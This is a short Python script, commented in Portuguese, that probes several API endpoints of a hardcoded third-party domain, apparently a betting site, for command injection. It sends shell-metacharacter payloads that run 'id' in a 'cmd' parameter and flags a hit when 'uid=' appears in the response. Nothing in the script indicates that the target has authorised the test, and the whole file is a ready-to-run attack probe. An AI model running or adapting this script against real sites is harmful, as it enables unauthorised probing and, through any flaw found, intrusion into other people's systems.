import requests

def test_command_injection(url):
    # Endpoints que costumam processar comandos ou arquivos
    endpoints = ["/api/v1/debug", "/api/v1/system", "/api/v1/ping"]
    payloads = ["; id", "| id", "`id`", "$(id)"]
    
    print(f"[*] Testando Command Injection em {url}...")
    
    for ep in endpoints:
        for payload in payloads:
            test_url = f"{url}{ep}?cmd={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if "uid=" in response.text or "gid=" in response.text:
                    print(f"[!!!] VULNERABILIDADE: Command Injection detectada em {test_url}")
                    return True
            except:
                pass
                
    print("[-] Command Injection não detectada nos endpoints testados.")
    return False

if __name__ == "__main__":
    target = "https://w1-panda.bet"
    test_command_injection(target)
